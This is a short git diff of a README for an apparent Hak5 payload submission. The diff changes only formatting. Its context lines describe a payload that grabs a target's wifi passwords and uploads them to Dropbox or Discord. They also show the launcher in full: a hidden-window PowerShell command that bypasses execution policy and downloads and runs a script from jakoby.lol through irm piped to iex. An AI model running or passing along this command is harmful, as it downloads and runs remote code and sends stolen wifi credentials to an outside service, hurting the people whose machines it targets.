@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -36,9 +38,9 @@ This payload grabs your target's wifi passwords and uploads them to either Dropb
 
 Fill in either or both of these to methods to exfil your collected data
 
-```
+<pre><code>
 powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/e8v | iex
-```
+</code></pre>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
